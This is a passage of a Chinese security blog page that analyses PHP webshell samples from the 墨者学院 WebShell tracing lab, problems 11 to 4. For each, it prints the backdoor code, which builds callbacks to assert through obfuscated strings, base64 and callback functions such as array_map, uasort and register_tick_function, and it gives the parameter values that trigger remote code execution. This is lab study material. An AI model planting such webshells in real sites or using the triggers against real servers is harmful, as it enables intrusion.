@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" type="image/png" href="/img/icon.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="author" content="13l00m">
+  <meta name="keywords" content="">
+  <title>PHP恶意代码分析 ~ 13l00m&#39;World</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css"  >
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css"  >
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css"  >
+
+<link rel="stylesheet" href="/css/main.css"  >
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >
+
+
+</head>
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>13l00m&#39;World</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/alone.png')no-repeat center center;
+           background-size: cover;
+           background-attachment: scroll;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  星期四, 十一月 28日 2019, 9:58 上午
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    3k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      13 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="fas fa-angle-down scroll-down-arrow"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h2 id="墨者学院–WebShell代码分析溯源-第11题"><a href="#墨者学院–WebShell代码分析溯源-第11题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第11题)"></a>墨者学院–WebShell代码分析溯源(第11题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="number">1</span>]) &amp;&amp; $_GET[<span class="number">1</span>]==<span class="string">'GET.fPZ87'</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		$_=@fopen(<span class="string">'t.php'</span>, <span class="string">'a'</span>);</span><br><span class="line"></span><br><span class="line"> 		@fwrite($_,<span class="string">"&lt;?php \$_=str_replace('ilo','ass',str_replace('vey','ert',\$_GET[2]));@\$_(\$_POST[1]);?&gt;"</span>);</span><br><span class="line"> 		</span><br><span class="line"> 		@fclose($_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5">程序分析</font></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="number">1</span>]) &amp;&amp; $_GET[<span class="number">1</span>]==<span class="string">'GET.fPZ87'</span>)</span><br><span class="line">    <span class="comment">//判断通过GET方式参数1是否为空 且 参数值是否为 GET.fPZ87</span></span><br><span class="line">    $_= @fopen(<span class="string">'t.php'</span>,<span class="string">'a'</span>);<span class="comment">// 打开一个新文件 t.php ,模式 a 为写入内容不覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分析构造的一句话</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       </span><br><span class="line">       \$_=str_replace(<span class="string">'ilo'</span>,<span class="string">'ass'</span>,str_replace(<span class="string">'vey'</span>,<span class="string">'ert'</span>,\$_GET[<span class="number">2</span>]));</span><br><span class="line"></span><br><span class="line">   	@\$_(\$_POST[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="meta">?&gt;</span></span><br><span class="line">      	变量 $_ 由 $_GET[<span class="number">2</span>] 通过GET方式传入数据，再由嵌套替换决定最后的内容</span><br><span class="line">       \$_ 与 \$_GET[<span class="number">2</span>] 前面的 \ 是转义用的</span><br><span class="line">       str_replace(待匹配字符,待替换字符,待匹配字符串)</span><br><span class="line">       </span><br><span class="line">       所以呢，最后拼接的一句话为：</span><br><span class="line">       	assert($_POST[<span class="number">1</span>])</span><br><span class="line">       <span class="comment">//当然 要完成这种拼接，$_GET[2]需要传入的值为：ilovey</span></span><br><span class="line">       				    $_POST[<span class="number">1</span>]需要传入的值为：需要执行的php代码</span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5">实战</font></p>
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC11%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC11%E9%A2%98)/2.png" srcset="undefined" alt></p>
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC11%E9%A2%98)/3.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第10题"><a href="#墨者学院–WebShell代码分析溯源-第10题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第10题)"></a>墨者学院–WebShell代码分析溯源(第10题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'GET'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5">程序分析</font></p>
+<h3 id="php-declare-ticks-N"><a href="#php-declare-ticks-N" class="headerlink" title="php declare (ticks = N)"></a><a href="https://www.cnblogs.com/debmzhang/p/4234328.html" target="_blank" rel="noopener">php declare (ticks = N)</a></h3><h3 id="关于什么是低级语句"><a href="#关于什么是低级语句" class="headerlink" title="关于什么是低级语句"></a><a href="http://my.oschina.net/Jacker/blog/32936" target="_blank" rel="noopener"><strong>关于什么是低级语句</strong></a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//尽管程序出错也不会报错</span></span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];  <span class="comment">// 接收参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>); </span><br><span class="line"><span class="comment">//php官方文档对ticks的定义 ：</span></span><br><span class="line"><span class="comment">//A tick is an event that occurs for every N low-level tickable statements executed by the parser within the declare block. The value for N is specified using ticks=N within the declare block's directive section.||</span></span><br><span class="line">Tick（时钟周期）是一个在 <span class="keyword">declare</span> 代码段中解释器每执行 N 条可计时的低级语句就会发生的事件。N 的值是在 <span class="keyword">declare</span> 中的 directive 部分用ticks=N 来指定的. </span><br><span class="line"></span><br><span class="line">我个人理解的大意就是说, tick 这个周期上会绑定一个事件, 这个事件, 当Zend引擎执行到所设置的 tick (就是N) 行低级语句时, 就执行  register_tick_function()  定义的事件 </span><br><span class="line"> </span><br><span class="line">因为这里只涉及到如何利用register_tick_function()函数进行构造代码执行，暂不深究</span><br><span class="line">  </span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'GET'</span>]);</span><br><span class="line"></span><br><span class="line">register_tick_function(函数名,给函数传入的值)</span><br><span class="line">如果要构造远程代码执行的话：register_tick_function(<span class="string">'assert'</span>,<span class="string">'command'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5">实战</font></p>
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC10%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第9题"><a href="#墨者学院–WebShell代码分析溯源-第9题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第9题)"></a>墨者学院–WebShell代码分析溯源(第9题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">'REQUEST'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><font face="黑体" color="white" size="5">程序分析</font></p>
+<h3 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function()"></a><a href="https://blog.csdn.net/tdcqfyl/article/details/52291237" target="_blank" rel="noopener">register_shutdown_function()</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//不报错</span></span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];<span class="comment">// $_REQUEST[] POST、GET都可传入参数</span></span><br><span class="line"></span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">'REQUEST'</span>]);</span><br><span class="line"></span><br><span class="line">前面已经po出了register_shutdown_function()函数的应用环境，在这里就简单说一下</span><br><span class="line">register_shutdown_function(待执行的函数名,向函数里面传入的值)<span class="comment">//这里依然用 assert 进行构造代码执行</span></span><br><span class="line"></span><br><span class="line">当PHP程序执行完成后，自动执行register_shutdown_function函数，该函数需要一个参数，用来指定由谁处理这些后续的工作。其中，程序执行完成，分为以下几种情况:</span><br><span class="line"></span><br><span class="line">	第一种：php代码执行过程中发生错误</span><br><span class="line"></span><br><span class="line">	第二种：php代码顺利执行成功</span><br><span class="line"></span><br><span class="line">	第三种：php代码运行超时</span><br><span class="line"></span><br><span class="line">	第四种：页面被用户强制停止</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><font face="黑体" color="white" size="5">实战</font></p>
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC9%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第8题"><a href="#墨者学院–WebShell代码分析溯源-第8题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第8题)"></a>墨者学院–WebShell代码分析溯源(第8题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line"></span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<h3 id="array-walk"><a href="#array-walk" class="headerlink" title="array_walk() "></a><a href="https://www.2cto.com/shouce/w3school/php/func_array_walk.asp.html" target="_blank" rel="noopener">array_walk() </a></h3><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a><a href="https://www.jb51.net/article/145649.htm" target="_blank" rel="noopener">preg_replace()</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line"></span><br><span class="line">上面定义数组的意思是,通过$_POST[<span class="string">'pass'</span>]传入数组元素的键名,<span class="string">'|.*|e'</span>为该键键值</span><br><span class="line">php定义数组也可以直接输入键值 -&gt; $arr = <span class="keyword">array</span>(键值<span class="number">1</span>,键值<span class="number">2</span>,键值<span class="number">3</span>);</span><br><span class="line">如果php数组里面上述两种情况都出现</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">			&lt;?php</span></span><br><span class="line"><span class="string">				function test($a,$b)&#123;</span></span><br><span class="line"><span class="string">					echo "$a,$b&lt;/br&gt;";</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">				$a = array(1,"qian"=&gt;"hou",2,3,4);  1,2,3,4相对应的键名不会因为第二个元素的出现发生改变</span></span><br><span class="line"><span class="string">											      查看如何输出可以将代码执行</span></span><br><span class="line"><span class="string">				array_walk($a,'</span>test<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			?&gt;</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">array_walk(<span class="keyword">array</span>,<span class="function"><span class="keyword">function</span>,<span class="title">userdata</span>...)</span></span><br><span class="line"><span class="function">	<span class="title">array_walk</span><span class="params">(数组名（一个元素的键名与键值当作右侧函数的第二、第一个参数）,定义的函数名,传入的第三个参数)</span></span></span><br><span class="line"><span class="function">	利用<span class="title">array_wlak</span>传参的功能，借助 <span class="title">preg_replace</span><span class="params">()</span> 可导致代码执行</span></span><br><span class="line"><span class="function"><span class="title">preg_replace</span><span class="params">()</span>：</span></span><br><span class="line"><span class="function">    <span class="title">preg_replace</span>  函数执行一个正则表达式的搜索和替换当开启 /<span class="title">e</span> 模式时，通过正则表达式匹配到的数据会先通过<span class="title">php</span>代				    码的方式执行</span></span><br><span class="line"><span class="function">    <span class="title">preg_replace</span> <span class="params">($pattern<span class="params">(正则表达式及相应的模式)</span>,$replacement<span class="params">(待匹配数据)</span>,$subject<span class="params">(待替换数据)</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">整体流程分析</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line">    $e = $_REQUEST['e'];  通过REQUEST['e'] 传入 preg_replace() 函数</span><br><span class="line"></span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>] =&gt; <span class="string">'|.*|e'</span>,); 	通过 POST 传入 将要执行的php代码,将该函数与正则表达													式<span class="string">'|.*|e'</span></span><br><span class="line">    array_walk($arr, $e, <span class="string">''</span>); -&gt; <span class="keyword">array</span>($arr,preg_replace(),<span class="string">''</span>) <span class="comment">// 第三个参数是将匹配到的字符替换为 ''</span></span><br><span class="line">    </span><br><span class="line">    一定要记住第一个参数(数组)传入的键名与键值分别当作传入函数的第二参数与第一参数, preg_replace 的第二参数才	 可以导致代码执行，第一参数用来匹配字符。</span><br><span class="line">    如果传入的代码匹配不完整会导致命令无法执行</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC8%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第7题"><a href="#墨者学院–WebShell代码分析溯源-第7题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第7题)"></a>墨者学院–WebShell代码分析溯源(第7题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'POST'</span>]);</span><br><span class="line"></span><br><span class="line">uasort($arr, base64_decode($e));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<h3 id="uasort-Array-MyFunction"><a href="#uasort-Array-MyFunction" class="headerlink" title="uasort(Array,MyFunction)"></a><a href="https://www.w3school.com.cn/php/func_array_uasort.asp" target="_blank" rel="noopener">uasort(Array,MyFunction)</a></h3><h3 id="利用python进行base64加密"><a href="#利用python进行base64加密" class="headerlink" title="利用python进行base64加密"></a>利用python进行base64加密</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>]; <span class="comment">// 传入可执行代码的函数，需要base64编码</span></span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'POST'</span>]);<span class="comment">//向数组中添加一个元素（待执行php命令）</span></span><br><span class="line"></span><br><span class="line">uasort($arr, base64_decode($e));</span><br><span class="line"></span><br><span class="line">uasort(传入的数组,编码后的执行函数)</span><br><span class="line">    </span><br><span class="line">    uasort 将数组传入函数中(参数<span class="number">2</span>)进行重新整合（整合情况根据函数内容决定），在整合过程中会造成php代码执行</span><br><span class="line">    base64编码可利用python内置base64模块进行编码</span><br><span class="line">    	base64.b64encode(<span class="string">'待编码字符串'</span>.encode(<span class="string">'urf8'</span>))</span><br><span class="line">    </span><br><span class="line">综上 传入与构造的语句应为：</span><br><span class="line">    e = base64.b64encode(<span class="string">'assert'</span>.encode()) -&gt;YXNzZXJ0 (e = YXNzZXJ0)</span><br><span class="line">    $_REQUEST[<span class="string">'POST'</span>] = phpinfo() <span class="comment">//证明可执行代码即可</span></span><br><span class="line">  	$arr = (<span class="string">'test'</span>,<span class="string">'phpinfo()'</span>)</span><br><span class="line">    uasort($arr,<span class="string">'assert'</span>) -&gt; 将<span class="string">'test'</span>,<span class="string">'phpinfo()'</span> 分别传入assert，遇到phpinfo() 进行代码执行</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC7%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第6题"><a href="#墨者学院–WebShell代码分析溯源-第6题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第6题)"></a>墨者学院–WebShell代码分析溯源(第6题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);</span><br><span class="line"></span><br><span class="line">array_map(base64_decode($e), $arr);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<h3 id="array-map-MyFunction-Array"><a href="#array-map-MyFunction-Array" class="headerlink" title="array_map(MyFunction,Array)"></a><a href="https://www.w3school.com.cn/php/func_array_map.asp" target="_blank" rel="noopener">array_map(MyFunction,Array)</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);</span><br><span class="line"></span><br><span class="line"><span class="comment">//前面都是些老生常谈的东西，在这里就不细说了</span></span><br><span class="line">array_map(base64_decode($e), $arr);</span><br><span class="line"></span><br><span class="line">array_map(<span class="function"><span class="keyword">Function</span>,<span class="title">Array</span>)</span></span><br><span class="line"><span class="function">    <span class="title">Function</span> 里面有对数组元素内容自定义的操作，传入函数时元素值若为<span class="title">php</span>可执行代码，则会导致代码执行</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">如何用<span class="title">python</span>将字符串加密上面说过了</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">接下来构造传参导致代码执行</span></span><br><span class="line"><span class="function">    <span class="title">e</span> = <span class="title">YXNzZXJ0</span><span class="params">(<span class="string">'assert'</span> base64编码后的内容)</span></span></span><br><span class="line"><span class="function">    <span class="title">POST</span><span class="params">(POST方式)</span> = <span class="title">phpinfo</span><span class="params">()</span> //可证明代码执行即可</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC6%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第5题"><a href="#墨者学院–WebShell代码分析溯源-第5题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第5题)"></a>墨者学院–WebShell代码分析溯源(第5题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>, $_REQUEST[<span class="string">'assert'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<h3 id="call-user-func-MyFunction-待传入参数"><a href="#call-user-func-MyFunction-待传入参数" class="headerlink" title="call_user_func(MyFunction,待传入参数)"></a><a href="https://www.php.net/manual/zh/function.call-user-func.php" target="_blank" rel="noopener">call_user_func(MyFunction,待传入参数)</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>, $_REQUEST[<span class="string">'assert'</span>]);</span><br><span class="line"></span><br><span class="line">call_user_func(MyFunction,待传入的参数)</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    	&lt;?php</span></span><br><span class="line"><span class="string">			function test($a)&#123;</span></span><br><span class="line"><span class="string">				echo $a;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">			@call_user_func('</span>test<span class="string">',$_POST[cmd]); //test为自定义参数,通过POST传入的参数即运行结果</span></span><br><span class="line"><span class="string">		?&gt;</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line">既然能够调用任意函数，当然也能调用可执行代码的危险函数 assert </span><br><span class="line">    因为代码中已经存在 assert 所以在这里直接传入待执行的命令就好</span><br><span class="line">    assert = phpinfo() 这里通过REQUEST传入，POST、GET都可以</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC5%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第4题"><a href="#墨者学院–WebShell代码分析溯源-第4题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第4题)"></a>墨者学院–WebShell代码分析溯源(第4题)</h2><hr>
